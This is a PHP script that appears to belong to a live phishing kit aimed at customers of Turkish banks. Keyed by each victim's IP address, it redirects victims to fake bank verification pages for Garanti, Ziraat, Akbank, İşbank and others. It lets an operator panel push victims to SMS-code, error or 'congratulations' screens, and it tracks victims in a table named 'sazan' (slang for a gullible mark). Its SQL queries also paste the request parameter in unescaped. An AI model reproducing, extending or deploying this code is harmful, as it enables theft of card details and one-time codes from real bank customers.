<?php 
include '../../baglan.php';
$ip = $_GET["ip"];
$sms = $db->query("SELECT * FROM sms", PDO::FETCH_ASSOC);
function contains($str, array $arr) {
    foreach($arr as $a) {
        if (str_contains($str,$a) !== false) return true;
    }
    return false;
}

$banks = array('GARANTİ', 'GARANTI', 'YAPI VE KREDI', 'YAPI VE KREDİ', 'YAPI KREDI', 'YAPI KREDİ', 'ZIRAAT', 'ZİRAAT', 'AKBANK','FINANSBANK', 'FİNANSBANK', 'FİNANS BANK', 'DENIZBANK', 'DENİZBANK', 'ING BANK','İNG BANK', 'HALK BANK', 'IS BANK','İŞBANK', 'İŞ BANK');
foreach($sms as $row1) {
    if($row1['sms'] == $ip) {
		if(isset($row1['bank']) && contains($row1['bank'], $banks)) {
			$bank = $row1['bank'];
			if(str_contains($bank, 'GARANTI') || str_contains($bank, 'GARANTİ')) {
				echo '../acs/garanti.php';
			} else if(str_contains($bank, 'YAPI VE KREDI') || str_contains($bank, 'YAPI VE KREDİ') || str_contains($bank, 'YAPI KREDI') || str_contains($bank, 'YAPI KREDİ')) {
				echo '../acs/yapikredi.php';
			} else if(str_contains($bank, 'ZIRAAT') || str_contains($bank, 'ZİRAAT')) {
				echo '../acs/ziraat.php';
			} else if(str_contains($bank, 'AKBANK')) {
				echo '../acs/akbank.php';
			} else if(str_contains($bank, 'FINANSBANK') || str_contains($bank, 'FİNANSBANK') || str_contains($bank, 'FİNANS BANK')) {
				echo '../acs/finansbank.php';
			} else if(str_contains($bank, 'DENIZBANK') || str_contains($bank, 'DENİZBANK')) {
				echo '../acs/denizbank.php';
			} else if(str_contains($bank, 'ING BANK') || str_contains($bank, 'İNG BANK')) {
				echo '../acs/ing.php';
			} else if(str_contains($bank, 'HALK BANK')) {
				echo '../acs/halkbank.php';
			} else if(str_contains($bank, 'IS BANK') || str_contains($bank, 'İŞ BANK') || str_contains($bank, 'İŞBANK')) {
				echo '../acs/isbankasi.php';
			} else echo '../acs/sms.php';
		} else echo '../acs/sms.php';
        $db->query("DELETE FROM sms WHERE sms='$ip'");
	} 
}
$sms2 = $db->query("SELECT * FROM sms2", PDO::FETCH_ASSOC);
foreach($sms2 as $row5){
    if($row5['sms2'] == $ip){ 
		if(isset($row5['bank']) && contains($row5['bank'], $banks)) {
			$bank = $row5['bank'];
			if(str_contains($bank, 'GARANTI') || str_contains($bank, 'GARANTİ')) {
				echo '../acs/garanti.php?hata=true';
			} else if(str_contains($bank, 'YAPI VE KREDI') || str_contains($bank, 'YAPI VE KREDİ') || str_contains($bank, 'YAPI KREDI') || str_contains($bank, 'YAPI KREDİ')) {
				echo '../acs/yapikredi.php?hata=true';
			} else if(str_contains($bank, 'ZIRAAT') || str_contains($bank, 'ZİRAAT')) {
				echo '../acs/ziraat.php?hata=true';
			} else if(str_contains($bank, 'AKBANK')) {
				echo '../acs/akbank.php?hata=true';
			} else if(str_contains($bank, 'FINANSBANK') || str_contains($bank, 'FİNANSBANK') || str_contains($bank, 'FİNANS BANK')) {
				echo '../acs/finansbank.php?hata=true';
			} else if(str_contains($bank, 'DENIZBANK') || str_contains($bank, 'DENİZBANK')) {
				echo '../acs/denizbank.php?hata=true';
			} else if(str_contains($bank, 'ING BANK') || str_contains($bank, 'İNG BANK')) {
				echo '../acs/ing.php?hata=true';
			} else if(str_contains($bank, 'HALK BANK')) {
				echo '../acs/halkbank.php?hata=true';
			} else if(str_contains($bank, 'IS BANK') || str_contains($bank, 'İŞ BANK') || str_contains($bank, 'İŞBANK')) {
				echo '../acs/isbankasi.php?hata=true';
			} else echo '../acs/hatali.php';
		} else echo '../acs/hatali.php';
        $db->query("DELETE FROM sms2 WHERE sms2='$ip'");
	} 
}
$tebrik = $db->query("SELECT * FROM tebrik", PDO::FETCH_ASSOC);
foreach($tebrik as $row2){
    if($row2['tebrik'] == $ip){ 
        echo "../" . $siteAyarlari['panel'] . "/./tebrik.php";
        $db->query("DELETE FROM tebrik WHERE tebrik='$ip'");
	} 
}
$hata = $db->query("SELECT * FROM hata", PDO::FETCH_ASSOC);
foreach($hata as $row4){
    if($row4['hata'] == $ip){ 
		echo "../" . $siteAyarlari['panel'] . "/./hata.php?t=".$row4['type'];
        $db->query("DELETE FROM hata WHERE hata='$ip'");
	} 
}
$priv = $db->query("SELECT * FROM priv", PDO::FETCH_ASSOC);
foreach($priv as $row7){
    if($row7['priv'] == $ip){ 
		echo "../" . $siteAyarlari['panel'] . "/./priv.php";
        $db->query("DELETE FROM priv WHERE priv='$ip'");
	} 
}

$back = $db->query("SELECT * FROM back", PDO::FETCH_ASSOC);
foreach($back as $row6) {
    if($row6['back'] == $ip) { 
        echo "../" . $siteAyarlari['panel'] . "/./";
        $db->query("DELETE FROM back WHERE back='$ip'");
	} 
}

$userIp;
if(isset($_SERVER['HTTP_CF_CONNECTING_IP'])) {
    $userIp = $_SERVER['HTTP_CF_CONNECTING_IP'];
} else {
    $userIp = $_SERVER['REMOTE_ADDR'];
}
if($userIp == $_GET['ip']) {
	$timex = time()+7;
	$db->query("UPDATE sazan SET lastOnline = '$timex' WHERE ip = '$ip'");

	$query = $db->query("SELECT * FROM ips WHERE ipAddress = '$ip'")->fetch(PDO::FETCH_ASSOC);
	if($query) {
		$db->query("UPDATE ips SET lastOnline = '$timex' WHERE ipAddress = '$ip'");
	} else {
		$query = $db->prepare("INSERT INTO ips SET ipAddress = ?, lastOnline = ?");
		$insert = $query->execute(array($ip, $timex));
	}
}
?>